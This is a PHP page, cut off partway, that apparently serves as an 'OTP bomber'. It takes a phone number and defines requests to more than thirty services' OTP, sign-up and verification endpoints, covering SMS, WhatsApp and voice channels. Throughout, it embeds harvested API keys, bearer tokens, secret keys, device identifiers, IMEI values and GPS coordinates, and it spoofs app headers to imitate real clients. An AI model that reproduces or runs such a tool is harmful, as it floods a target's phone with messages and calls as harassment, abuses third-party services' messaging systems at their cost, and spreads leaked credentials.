<!DOCTYPE html>
<html>
<head>
    <title>API Executor</title>
</head>
<body>
    <h1>API Executor</h1>
    <form method="get" action="">
        <label for="mobile">Enter Mobile Number:</label>
        <input type="text" id="mobile" name="mobile" required>
        <button type="submit">Submit</button>
    </form>

    <?php
    if (isset($_GET['mobile'])) {
        $mobile = htmlspecialchars($_GET['mobile']);
        
    $apis = [
        // ============ नए ADDED APIs ============
        
        // API 1: Registaniachar - Send OTP
        [
            "name" => "Registaniachar - Send OTP",
            "url" => "https://admin.registaniachar.com/api/whatsapp/send-otp",
            "headers" => [
                "User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
                "Accept: application/json, text/plain, */*",
                "Content-Type: application/json",
                "api-key: REGISTANI#2025@ACHAR!KEY",
                "origin: https://registaniachar.com"
            ],
            "method" => "POST",
            "data" => json_encode(["phone" => $mobile])
        ],
        
        // API 2: JustSwish - OTP Init (SMS)
        [
            "name" => "JustSwish - OTP Init (SMS)",
            "url" => "https://prod-api.justswish.in/api/v1/auth/otp/init",
            "headers" => [
                "User-Agent: okhttp/4.12.0",
                "Accept: *",
                "Content-Type: application/json",
                "app_version: 1.3.7",
                "platform: android",
                "x-device-id: e38599334e232f58"
            ],
            "method" => "POST",
            "data" => json_encode(["phoneNumber" => $mobile, "whatsapp" => false, "otpAutofillAppId" => "MZfwCDdKlkC"])
        ],
        
        // API 3: JustSwish - OTP Init (WhatsApp)
        [
            "name" => "JustSwish - OTP Init (WhatsApp)",
            "url" => "https://prod-api.justswish.in/api/v1/auth/otp/init",
            "headers" => [
                "User-Agent: okhttp/4.12.0",
                "Accept: *",
                "Content-Type: application/json",
                "app_version: 1.3.7",
                "platform: android",
                "x-device-id: e38599334e232f58"
            ],
            "method" => "POST",
            "data" => json_encode(["phoneNumber" => $mobile, "whatsapp" => true, "otpAutofillAppId" => "MZfwCDdKlkC"])
        ],
        
        // API 4: MyBillBook - Request OTP
        [
            "name" => "MyBillBook - Request OTP",
            "url" => "https://mybillbook.in/api/web/request_otp",
            "headers" => [
                "User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
                "Accept: application/json",
                "Content-Type: application/json",
                "client: web"
            ],
            "method" => "POST",
            "data" => json_encode(["mobile_number" => $mobile, "source" => "landing"])
        ],
        
        // API 5: ToolsVilla - User Sign Up
        [
            "name" => "ToolsVilla - User Sign Up",
            "url" => "https://api.toolsvilla.com/web/usrsign-up",
            "headers" => [
                "User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
                "Accept: application/json, text/plain, */*",
                "Content-Type: application/json"
            ],
            "method" => "POST",
            "data" => json_encode(["mobileno" => $mobile, "wtpSubs" => true, "callOptIn" => true, "txtMsg" => true])
        ],
        
        // API 6: GimBooks - Get OTP V2 (Note: recaptcha token required)
        [
            "name" => "GimBooks - Get OTP V2",
            "url" => "https://www.gimbooks.com/v4/account/auth/get-otp-v2/",
            "headers" => [
                "User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
                "Accept: application/json, text/plain, */*",
                "Content-Type: application/x-www-form-urlencoded; charset=UTF-8"
            ],
            "method" => "POST",
            "data" => "phone=" . $mobile . "&recaptcha-token=TEST_TOKEN&recaptcha-site-key=6LcE_6sqAAAAAEJ-NSsL69DegkaUVxPy5DVJac8L",
            "is_form" => true
        ],
        
        // ============ पुराने APIs (जो पहले से थे) ============
        
        // API 7: ElectricPe Send OTP
        [
            "name" => "ElectricPe Send OTP",
            "url" => "https://prodapi.electricpe.com/api/user-service/user/sendOtp?phoneNo=" . $mobile . "&secretKey=QOkDgC532UGa9pK3L0a",
            "headers" => [
                "User-Agent: Dart/3.10 (dart:io)",
                "Content-Type: application/x-www-form-urlencoded"
            ],
            "method" => "POST",
            "data" => "",
            "is_form" => true
        ],
            // API 2: ElectricPe Resend OTP Voice
            [
                "name" => "ElectricPe Resend OTP Voice",
                "url" => "https://prodapi.electricpe.com/api/user-service/user/resendOtp?phoneNo=" . $mobile . "&retryType=voice&secretKey=QOkDgC532UGa9pK3L0a",
                "headers" => [
                    "User-Agent: Dart/3.10 (dart:io)",
                    "Accept: application/json",
                    "Accept-Encoding: gzip",
                    "cellid: 2cd5a9fa-b80a-4139-bdda-463f152985fa",
                    "content-type: application/json",
                    "latitude: 0.0",
                    "platform: ANDROID",
                    "offset: 330",
                    "longitude: 0.0",
                    "version: 535",
                    "prod: true",
                    "sourceapp: consumer"
                ],
                "method" => "POST",
                "data" => json_encode([])
            ],
            // API 3: Bumble Submit Phone Number
            [
                "name" => "Bumble Submit Phone Number",
                "url" => "https://bumble.com/mwebapi.phtml?SERVER_SUBMIT_PHONE_NUMBER",
                "headers" => [
                    "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Safari/537.36",
                    "Content-Type: application/json",
                    "x-use-session-cookie: 1",
                    "x-message-type: 678",
                    "origin: https://bumble.com",
                    "referer: https://bumble.com/registration/confirm-phone",
                    "accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7"
                ],
                "method" => "POST",
                "data" => json_encode([
                    "\$gpb" => "badoo.bma.BadooMessage",
                    "body" => [[
                        "message_type" => 678,
                        "server_submit_phone_number" => [
                            "phone_prefix" => "+91",
                            "screen_context" => ["screen" => 25],
                            "phone" => $mobile,
                            "context" => 203,
                            "reset" => true
                        ]
                    ]],
                    "message_id" => 34,
                    "message_type" => 678,
                    "version" => 1,
                    "is_background" => false
                ])
            ],
            // API 4: Badoo Submit Phone Number
            [
                "name" => "Badoo Submit Phone Number",
                "url" => "https://badoo.com/mwebapi.phtml?SERVER_SUBMIT_PHONE_NUMBER",
                "headers" => [
                    "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Safari/537.36",
                    "Content-Type: application/json",
                    "x-user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Safari/537.36",
                    "x-use-session-cookie: 1",
                    "x-message-type: 678",
                    "origin: https://badoo.com",
                    "referer: https://badoo.com/onboarding-phone",
                    "accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7"
                ],
                "method" => "POST",
                "data" => json_encode([
                    "\$gpb" => "badoo.bma.BadooMessage",
                    "body" => [[
                        "message_type" => 678,
                        "server_submit_phone_number" => [
                            "screen_context" => ["screen_id" => "128", "flow_id" => "badoo_mobile_registration_v2"],
                            "phone_prefix" => "91",
                            "phone" => $mobile
                        ]
                    ]],
                    "message_id" => 11,
                    "message_type" => 678,
                    "version" => 1,
                    "is_background" => false
                ])
            ],
            // API 5: Pickrr User Login
            [
                "name" => "Pickrr User Login",
                "url" => "https://edge.pickrr.com/aggregator/api/ve1/aggregator-service/user/login",
                "headers" => [
                    "User-Agent: Mozilla/5.0 (Linux; Android 9; Redmi 6 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36",
                    "Accept: application/json, text/plain, */*",
                    "Accept-Encoding: gzip, deflate",
                    "Content-Type: application/json",
                    "pim-sid: c0a0f3b7-7439-4a77-a4c0-5a8c062a71ad",
                    "sid: 690daf12221ecbd34aa494a7",
                    "origin: https://fastrr-boost-ui.pickrr.com",
                    "x-fastrr-origin: www.zavya.co",
                    "x-device-id: fastrr",
                    "x-requested-with: co.zavya",
                    "referer: https://fastrr-boost-ui.pickrr.com/",
                    "accept-language: en-IN,en-US;q=0.9,en;q=0.8"
                ],
                "method" => "POST",
                "data" => json_encode([
                    "cred" => $mobile,
                    "tenant_id" => "690daf12221ecbd34aa494a7",
                    "cart_id" => "6a06cc600e54003a62a73825",
                    "skip_existing_address_check" => false
                ])
            ],
            // API 6: Pickrr Resend OTP
            [
                "name" => "Pickrr Resend OTP",
                "url" => "https://edge.pickrr.com/identity-service/authenticate/resend_otp",
                "headers" => [
                    "User-Agent: Mozilla/5.0 (Linux; Android 9; Redmi 6 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36",
                    "Accept: application/json, text/plain, */*",
                    "Accept-Encoding: gzip, deflate",
                    "Content-Type: application/json",
                    "pim-sid: c0a0f3b7-7439-4a77-a4c0-5a8c062a71ad",
                    "sid: 690daf12221ecbd34aa494a7",
                    "origin: https://fastrr-boost-ui.pickrr.com",
                    "x-fastrr-origin: www.zavya.co",
                    "x-device-id: fastrr",
                    "x-requested-with: co.zavya",
                    "referer: https://fastrr-boost-ui.pickrr.com/",
                    "accept-language: en-IN,en-US;q=0.9,en;q=0.8"
                ],
                "method" => "POST",
                "data" => json_encode([
                    "authentication_token" => "802d381a-83fa-4f87-9575-531bd82ce48a",
                    "mobile_no" => $mobile,
                    "channel" => "SMS",
                    "resend_via_whatsapp" => true,
                    "engage_whatsapp_opted" => false,
                    "company_id" => "1241062",
                    "cart_id" => "6a06cc600e54003a62a73825",
                    "four_digit_otp" => true
                ])
            ],
            // API 7: Manamangalagiri WhatsApp Send OTP
            [
                "name" => "Manamangalagiri WhatsApp Send OTP",
                "url" => "https://phbbxhweurpwcivkwncq.supabase.co/functions/v1/wa-send-otp",
                "headers" => [
                    "User-Agent: Mozilla/5.0 (Linux; Android 9; Redmi 6 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36",
                    "Accept-Encoding: gzip, deflate",
                    "Content-Type: application/json",
                    "x-client-info: supabase-js-web/2.103.3",
                    "origin: https://manamangalagiri.com",
                    "authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InBoYmJ4aHdldXJwd2Npdmt3bmNxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzY2MTMwNDksImV4cCI6MjA5MjE4OTA0OX0.eU1BnugUkIQXDRVO0As5EgAGiqDLiIjPe-OkudMOuWk",
                    "apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InBoYmJ4aHdldXJwd2Npdmt3bmNxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzY2MTMwNDksImV4cCI6MjA5MjE4OTA0OX0.eU1BnugUkIQXDRVO0As5EgAGiqDLiIjPe-OkudMOuWk",
                    "x-requested-with: com.manamangalagiri.app",
                    "referer: https://manamangalagiri.com/",
                    "accept-language: en-IN,en-US;q=0.9,en;q=0.8"
                ],
                "method" => "POST",
                "data" => json_encode(["phone" => "91" . $mobile])
            ],
            // API 8: Sangam Send Login OTP
            [
                "name" => "Sangam Send Login OTP",
                "url" => "https://hera.sangam.com/api/users/sendLoginOtp",
                "headers" => [
                    "User-Agent: Mozilla/5.0 (Linux; Android 9; Redmi 6 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36 SGAndroid/3.15.1 com.communityshaadi.android",
                    "Accept: application/json, text/plain, */*",
                    "Accept-Encoding: gzip, deflate",
                    "Content-Type: application/json",
                    "origin: https://www.sangam.com",
                    "x-app-key: 95d7e28234ce4318ac6a732a38bf659f1f431e865ed7c789d35854b9b246873b",
                    "x-platform: native-android",
                    "x-access-token: a41733e10e3785ba2de3727120ac9d2c27306ed4e08dc639e72218d1b18f4f6d|guest|",
                    "x-requested-with: com.communityshaadi.android",
                    "referer: https://www.sangam.com/login?mode=mobile",
                    "accept-language: en-IN,en-US;q=0.9,en;q=0.8"
                ],
                "method" => "POST",
                "data" => json_encode(["data" => ["mobile" => $mobile, "countryCode" => "+91"]])
            ],
            // API 9: GoKwik Send OTP
            [
                "name" => "GoKwik Send OTP",
                "url" => "https://gkx.gokwik.co/kp/api/v1/auth/otp/send",
                "headers" => [
                    "User-Agent: okhttp/4.12.0",
                    "Accept-Encoding: gzip",
                    "Content-Type: application/json",
                    "gk-merchant-id: 19g6ilna7x8mn",
                    "gk-request-id: 10c19728-91e2-43b7-9617-d1d0a3176a69",
                    "kp-request-id: 10c19728-91e2-43b7-9617-d1d0a3176a69",
                    "authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc3ODgzMTI4NCwiZXhwIjoxNzc4ODMxMzQ0fQ.9Q4t6pCuxD7T9snATABwihDnrg7zMq6jY_BveboZ-7c",
                    "appplatform: android",
                    "appversion: 1.23.0",
                    "source: android-app"
                ],
                "method" => "POST",
                "data" => json_encode(["phone" => $mobile])
            ],
            // API 10: Shadowfax Send OTP
            [
                "name" => "Shadowfax Send OTP",
                "url" => "https://api.shadowfax.in/delivery/otp/send/v2/",
                "headers" => [
                    "User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
                    "Accept: application/json, text/plain, */*",
                    "Accept-Encoding: gzip, deflate, br, zstd",
                    "Content-Type: application/json",
                    "authorization: Token OR1ZPU7MXE5OYTNQM2UYG320XDUSFFOQOVEFZZXT291G96AEFU2J7EI2DBDL",
                    "referrer: flash_web",
                    "origin: https://delivery.shadowfax.in",
                    "x-requested-with: mark.via.gp",
                    "referer: https://delivery.shadowfax.in/",
                    "accept-language: en-GB,en-US;q=0.9,en;q=0.8"
                ],
                "method" => "POST",
                "data" => json_encode(["mobile_number" => $mobile])
            ],
            // API 11: ClarityApp Send OTP
            [
                "name" => "ClarityApp Send OTP",
                "url" => "https://services.clarityapp.in/auth/phone/otp/send?phoneNumber=91" . $mobile,
                "headers" => [
                    "User-Agent: okhttp/4.12.0",
                    "Accept-Encoding: gzip",
                    "avn: 3.46.1",
                    "pltfrm: ANDROID",
                    "avc: 345",
                    "content-type: application/json"
                ],
                "method" => "GET",
                "data" => ""
            ],
            // API 12: Rebtel Request SMS Code
            [
                "name" => "Rebtel Request SMS Code",
                "url" => "https://prod-gql.rebtel.com/graphql",
                "headers" => [
                    "User-Agent: Rebtel/Android/6.75.0/509",
                    "Accept: multipart/mixed;deferSpec=20220824, application/graphql-response+json, application/json",
                    "Accept-Encoding: gzip",
                    "Content-Type: application/json",
                    "authorization: instance :",
                    "x-timestamp: 2026-05-17T15:46:32.874Z",
                    "x-localtime: 2026-05-17T21:16:32.875+0530"
                ],
                "method" => "POST",
                "data" => json_encode([
                    "operationName" => "requestSmsCode",
                    "variables" => [
                        "normalizedPhoneNumber" => "+91" . $mobile,
                        "appId" => "73F71777CCF04417A4A4E2144528FE1F"
                    ],
                    "query" => "mutation requestSmsCode(\$normalizedPhoneNumber: Msisdn!, \$appId: ID!) { authenticationOtpWithMsisdn(input: { applicationKey: \$appId msisdn: \$normalizedPhoneNumber otpType: SMS } ) { key errors { __typename ... on ApplicationNotFoundError { key message userMessage } ... on OtpReportDeniedError { message userMessage } } } }",
                    "extensions" => ["clientLibrary" => ["name" => "apollo-kotlin", "version" => "4.4.3"]]
                ])
            ],
            // API 13: Rupee112 Login
            [
                "name" => "Rupee112 Login",
                "url" => "https://www.rupee112.com/login-sbm",
                "headers" => [
                    "User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
                    "Accept: application/json, text/javascript, */*; q=0.01",
                    "Accept-Encoding: gzip, deflate, br, zstd",
                    "X-Requested-With: XMLHttpRequest",
                    "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
                    "Origin: https://www.rupee112.com",
                    "Referer: https://www.rupee112.com/apply-now",
                    "Accept-Language: en-GB,en-US;q=0.9,en;q=0.8"
                ],
                "method" => "POST",
                "data" => "mobile=" . $mobile . "&current_page=login&is_existing_customer=2&device_id=3c2f1fb977b9f389dc7e60f5f3fa9c44",
                "is_form" => true
            ],
            // API 14: Eyecon Get Transport
            [
                "name" => "Eyecon Get Transport",
                "url" => "https://api.eyecon-app.com/app/cli_auth/gettransport?cv=vc_749_vn_4.2026.04.23.1145_a&cli=91" . $mobile . "&reg_id=ckQF79uvT5Wp1TiARtFbVm%3AAPA91bHyg4V5APWJdBdb-KyH9GI70WyolCRQABdCnhMjKNOsMxeFn7DRVd-2_UyU_1rDtWYWYTnK1njPGBprUsa4vCDPlF7uHvXIHoOx2O-Ko5bIQrnmqfw&is_already_social_auth=false&cv=vc_749_vn_4.2026.04.23.1145_a&installer_name=manually%20or%20unknown%20source&n_sims=1&time=1779553875166&is_sms_sending_available=true&is_whatsapp_installed=false&mc=70%3A3A%3A51%3AF6%3AA5%3A27&device_id=c72bbdf7d1cfe5d7&adv_id=f7b27fba-3bcc-48ad-9964-6e853374c735&imei=864279042711510%2C864279042711528&time_zone=Asia%2FKolkata&device_manu=Xiaomi&device_model=Redmi%206",
                "headers" => [
                    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
                    "Connection: Keep-Alive",
                    "Accept-Encoding: gzip",
                    "accept-charset: UTF-8",
                    "content-type: application/x-www-form-urlencoded; charset=utf-8"
                ],
                "method" => "GET",
                "data" => ""
            ],
            // API 15: Chaayos SMS
            [
                "name" => "Chaayos SMS OTP",
                "url" => "https://dine.chaayos.com/app-crm/v2/crm/v/r2/1000",
                "headers" => [
                    "User-Agent: okhttp/4.9.2",
                    "Accept: application/json",
                    "Accept-Encoding: gzip",
                    "Content-Type: application/json",
                    "devicekey: 5W8+WOK3eMB2WLM3rSSAbBzxj8PADndg/WGBt6ywzny4nUkyTUXbRG2aBXJQYZ23",
                    "cid: 1000",
                    "bid: 1",
                    "device-type: android"
                ],
                "method" => "POST",
                "data" => $mobile
            ],
            // API 16: Chaayos IVR
            [
                "name" => "Chaayos IVR OTP",
                "url" => "https://dine.chaayos.com/app-crm/v2/crm/v/r2-ivr/1000",
                "headers" => [
                    "User-Agent: okhttp/4.9.2",
                    "Accept: application/json",
                    "Accept-Encoding: gzip",
                    "Content-Type: application/json",
                    "devicekey: 5W8+WOK3eMB2WLM3rSSAbBzxj8PADndg/WGBt6ywzny4nUkyTUXbRG2aBXJQYZ23",
                    "cid: 1000",
                    "bid: 1",
                    "device-type: android"
                ],
                "method" => "POST",
                "data" => $mobile
            ],
            // API 17: Zingbus Login
            [
                "name" => "Zingbus Login",
                "url" => "https://www.zingbus.com/v1/login?versionV2=true",
                "headers" => [
                    "User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; Redmi 6 MIUI/V11.0.5.0.PCGMIXM)",
                    "Connection: Keep-Alive",
                    "Accept-Encoding: gzip",
                    "asid: a3b42400-c37d-ac6b-50d7-b58a9b9f52dc",
                    "X-TRACE-ID: B2CANDROID-7e098075-743d-4d80-89d6-da128e3b6ab3",
                    "aifa: f7b27fba-3bcc-48ad-9964-6e853374c735",
                    "andi: android_id",
                    "Content-Type: application/json; charset=utf-8"
                ],
                "method" => "POST",
                "data" => json_encode([
                    "mobileNo" => $mobile,
                    "distinctId" => "f9557bdb-95c4-421c-acc1-51f5eb7eba41",
                    "hashId" => "",
                    "source" => "B2CANDROID"
                ])
            ],
            // API 18: Abhibus Get OTP on WhatsApp
            [
                "name" => "Abhibus Get OTP on WhatsApp",
                "url" => "https://www.abhibus.com/app/v107/getOtpOnWhatsapp",
                "headers" => [
                    "User-Agent: okhttp/4.12.0",
                    "Accept-Encoding: gzip",
                    "imei: 648eb7005eb7f92c",
                    "x-app-token: LxtnJoZNBPT3/m+A56aE+HMCO6SQ60Emfyvl69E1lGchjXLjvHsAr+vigh322jO0vC6xCoEQLn2a9wiT84E4MRIXJRedWIoe0GcFwIs07uhv2SLyYzEu3nPhNZ2YKZOF",
                    "content-type: application/json; charset=UTF-8"
                ],
                "method" => "POST",
                "data" => json_encode(["mobileNum" => $mobile, "prd" => "ANDR"])
            ],
            // API 19: Cleartrip OTP
            [
                "name" => "Cleartrip OTP",
                "url" => "https://www.cleartrip.com/accounts/external-api/otp",
                "headers" => [
                    "User-Agent: okhttp/4.12.0",
                    "Accept: application/json",
                    "Accept-Encoding: gzip",
                    "Content-Type: application/json",
                    "x-client-id: CT",
                    "x-ct-sourcetype: MOBILE",
                    "x-source-type: B2C",
                    "channel: android",
                    "origin: https://www.cleartrip.com",
                    "referer: https://www.cleartrip.com",
                    "app-agent: AndroidApp"
                ],
                "method" => "POST",
                "data" => json_encode(["value" => $mobile, "type" => "MOBILE", "action" => "SIGNIN", "countryCode" => "+91"])
            ],
            // API 20: Nuego Mobile Sign Up
            [
                "name" => "Nuego Mobile Sign Up",
                "url" => "https://prdenv.nuego.in/graphql",
                "headers" => [
                    "User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0MobileSafari/537.36",
                    "Accept-Encoding: gzip",
                    "channel: Android",
                    "charset: utf-8",
                    "content-type: application/json;charset=UTF-8"
                ],
                "method" => "POST",
                "data" => json_encode([
                    "operationName" => null,
                    "variables" => ["mobileNumber" => $mobile, "token" => "", "deviceType" => "Android"],
                    "query" => "mutation mobileSignUpOrLogin(\$fullName: String, \$mobileNumber: String!, \$token: String, \$deviceType: String, \$referralCode: String) { __typename mobileSignUpOrLogin(fullName: \$fullName, mobileNumber: \$mobileNumber, token: \$token, deviceType: \$deviceType, referralCode: \$referralCode) { __typename status message timer } }"
                ])
            ],
            // API 21: Hoi Send OTP
            [
                "name" => "Hoi Send OTP",
                "url" => "https://apihub.hoi.in/auth/send-otp",
                "headers" => [
                    "User-Agent: okhttp/4.12.0",
                    "Accept: application/json, text/plain, */*",
                    "Accept-Encoding: gzip",
                    "Content-Type: application/json",
                    "device-type: mobile",
                    "device-id: f89486614839c6f0",
                    "x-ui-tag: D1D6F6285C7F58163AF5687CC83467F5E160AD314D43B0880189850C6CEB5F8F4D72650C5C53F2BD21FD909C43BDE828"
                ],
                "method" => "POST",
                "data" => json_encode(["mobile" => $mobile])
            ],
            // API 22: ZestMoney Generate OTP
            [
                "name" => "ZestMoney Generate OTP",
                "url" => "https://app.zestmoney.in/zestlife/v2/Customer/GenerateOtp",
                "headers" => [
                    "User-Agent: okhttp/4.9.1",
                    "Connection: Keep-Alive",
                    "Accept-Encoding: gzip",
                    "DeviceId: fce3830d693e211f",
                    "X-APP-VERSION-CODE: 1400062",
                    "X-APP-VERSION-NAME: 1.40.62",
                    "X-CLIENT-TIMESTAMP: 1779943035803",
                    "X-ANDROID-VERSION-CODE: 28",
                    "X-DEVICE-DENSITY: XHDPI",
                    "X-MOBILE_NAME: Redmi 6",
                    "merchantName: ZestMoney",
                    "Content-Type: application/json; charset=UTF-8"
                ],
                "method" => "POST",
                "data" => json_encode(["email" => "", "mobileNumber" => "91" . $mobile])
            ],
            // API 23: Savaari Send Login OTP
            [
                "name" => "Savaari Send Login OTP",
                "url" => "https://apiext.savaari.com/partner_api/public/send_login_otp?token=ZXlKMGVYQWlPaUpLVjFRaUxDSmhiR2NpT2lKSVV6VXhNaUo5LmV5SnBZWFFpT2pFM056azVORE13T0Rnc0ltcDBhU0k2SWxwY0wyaE1iek5DV1ZsV1NIQjNaRmQzVGxSc1VrcHVXVTAzSzFsS2VtZEdiSEo2WWtGQ1J6bHpXakYzUFNJc0ltbHpjeUk2SW5OaGRtRmhjbWtpTENKdVltWWlPakUzTnprNU5ETXdPRGdzSW1WNGNDSTZNVGM0TURVME56ZzRPQ3dpWkdGMFlTSTZleUpoY0dsTFpYa2lPaUkxTnpaaE5qYzRNMlZoTlRSbUlpd2lZWEJ3U1dRaU9pSTFOelpoTmpjNE5ESm1Zek5pSW4xOS5yV0pWZkZtMU12ZkE1QWx1TURSVXQwMm1rd2pCUWZjU1pZSGVmZGJKeWQ0b3BGbVlSa1lvYlh5ekdpNWtDRXQ4eFY0LTFwRy05ejRqVm1LNGdnRWZnQQ%3D%3D",
                "headers" => [
                    "User-Agent: Dart/3.11 (dart:io)",
                    "Accept-Encoding: gzip",
                    "Content-Type: application/x-www-form-urlencoded"
                ],
                "method" => "POST",
                "data" => "user_mobile=" . $mobile . "&device_type=app&user_isd_code=91|IND&send_whatsapp_flag=0",
                "is_form" => true
            ],
            // API 24: Namma Yatri Auth WhatsApp
            [
                "name" => "Namma Yatri Auth WhatsApp",
                "url" => "https://api.c2.moving.tech/pilot/app/v2/auth",
                "headers" => [
                    "User-Agent: okhttp/4.12.0",
                    "Accept-Encoding: gzip, deflate,br",
                    "Content-Type: application/json",
                    "x-rn-version: --",
                    "x-config-version: 0.0.1",
                    "x-client-version: 3.3.25",
                    "x-bundle-version: 0.0.0",
                    "x-device: xiaomi/Redmi 6/Android v9/cereus/Handset",
                    "x-package: in.juspay.nammayatri",
                    "session_id: ffe0b87e-92c4-4061-8ab6-5022d7caf183"
                ],
                "method" => "POST",
                "data" => json_encode([
                    "merchantId" => "NAMMA_YATRI",
                    "mobileNumber" => $mobile,
                    "mobileCountryCode" => "+91",
                    "allowBlockedUserLogin" => true,
                    "otpChannel" => "WHATSAPP"
                ])
            ],
            // API 25: Bharat Taxi Auth
            [
                "name" => "Bharat Taxi Auth",
                "url" => "https://api.moving.tech/pilot/app/v2/auth",
                "headers" => [
                    "User-Agent: okhttp/4.12.0",
                    "Accept-Encoding: gzip, deflate,br",
                    "Content-Type: application/json",
                    "x-sender-hash: y0qGR2yhTOI",
                    "x-rn-version: --",
                    "x-config-version: 0.0.1",
                    "x-client-version: 0.0.26",
                    "x-bundle-version: 0.0.0",
                    "x-device: xiaomi/Redmi 6/Android v9/cereus/Handset",
                    "x-package: in.mobility.bharatTaxi",
                    "session_id: 41782cbe-299d-49b9-a83c-500935121f8d"
                ],
                "method" => "POST",
                "data" => json_encode([
                    "merchantId" => "BHARAT_TAXI",
                    "mobileNumber" => $mobile,
                    "mobileCountryCode" => "+91",
                    "allowBlockedUserLogin" => true,
                    "senderHash" => "y0qGR2yhTOI"
                ])
            ],
            // API 26: Atlas Antelope Users
            [
                "name" => "Atlas Antelope Users",
                "url" => "https://prod.in.atlas-antelope.com/users/v3/users",
                "headers" => [
                    "User-Agent: okhttp/4.12.0",
                    "Accept-Encoding: gzip",
                    "x-session-key: 14d8bb8a-59ca-40a5-b71f-cbb4bc88c6d7",
                    "versioncode: 42600",
                    "androidversion: 28",
                    "android-id: 3525b4173cbc4b8a",
                    "content-type: application/json; charset=UTF-8"
                ],
                "method" => "POST",
                "data" => json_encode([
                    "authType" => "PIN",
                    "deviceData" => ["androidId" => "3525b4173cbc4b8a", "version" => "26.10.0"],
                    "tokenFetchStatus" => "timeout",
                    "username" => "+91" . $mobile
                ])
            ],
            // API 27: Cash247 Generate OTP
            [
                "name" => "Cash247 Generate OTP",
                "url" => "https://backend.cash247.in/api/v1/otp/generate-otp",
                "headers" => [
                    "User-Agent: Dart/3.9 (dart:io)",
                    "Accept-Encoding: gzip",
                    "Content-Type: application/json",
                    "device: android"
                ],
                "method" => "POST",
                "data" => json_encode(["phoneNumber" => $mobile])
            ],
            // API 28: Bolt SMS Verification
            [
                "name" => "Bolt SMS Verification",
                "url" => "https://user.live.boltsvc.net/profile/verification/start/v2?version=CA.211.0&deviceId=033775d8-bdc3-4466-89ae-13a2d6035815&device_name=XiaomiRedmi%206&device_os_version=9&channel=googleplay&brand=bolt&deviceType=android&signup_session_id&country=in&is_local_authentication_available=true&language=en&gps_lat=22.961885&gps_lng=75.202037&gps_accuracy_m=3.1&gps_age=17&session_id=033775d8-bdc3-4466-89ae-13a2d6035815u1779943705915&distinct_id=%24device%3A13b909c7-d693-48cc-a1e1-482b23714a40&rh_session_id=033775d8-bdc3-4466-89ae-13a2d6035815u1779943691",
                "headers" => [
                    "User-Agent: okhttp/4.12.0",
                    "Accept-Encoding: gzip",
                    "content-type: application/json; charset=UTF-8"
                ],
                "method" => "POST",
                "data" => json_encode([
                    "type" => "phone",
                    "phone_number" => "+91" . $mobile,
                    "method" => "sms",
                    "flow_type" => "sign_in"
                ])
            ],
            // API 29: Bolt Voice Verification
            [
                "name" => "Bolt Voice Verification",
                "url" => "https://user.live.boltsvc.net/profile/verification/start/v2?version=CA.211.0&deviceId=033775d8-bdc3-4466-89ae-13a2d6035815&device_name=XiaomiRedmi%206&device_os_version=9&channel=googleplay&brand=bolt&deviceType=android&signup_session_id&country=in&is_local_authentication_available=true&language=en&gps_lat=22.961953&gps_lng=75.202072&gps_accuracy_m=3.0&gps_age=9&session_id=033775d8-bdc3-4466-89ae-13a2d6035815u1779943764727&distinct_id=%24device%3A13b909c7-d693-48cc-a1e1-482b23714a40&rh_session_id=033775d8-bdc3-4466-89ae-13a2d6035815u1779943691",
                "headers" => [
                    "User-Agent: okhttp/4.12.0",
                    "Accept-Encoding: gzip",
                    "content-type: application/json; charset=UTF-8"
                ],
                "method" => "POST",
                "data" => json_encode([
                    "type" => "phone",
                    "phone_number" => "+91" . $mobile,
                    "method" => "voice",
                    "flow_type" => "sign_in"
                ])
            ],
            // API 30: Fitelo Send OTP
            [
                "name" => "Fitelo Send OTP",
                "url" => "https://live-prod.production.fitelo.net/auth/api/customer/otp/send",
                "headers" => [
                    "User-Agent: Dart/3.10 (dart:io)",
                    "Accept-Encoding: gzip",
                    "Content-Type: application/json"
                ],
                "method" => "POST",
                "data" => json_encode(["countryCode" => "+91", "phoneNumber" => "+91" . $mobile, "otpMethod" => "WHATSAPP"])
            ],
            // API 31: Cult.fit SMS OTP
            [
                "name" => "Cult.fit SMS OTP",
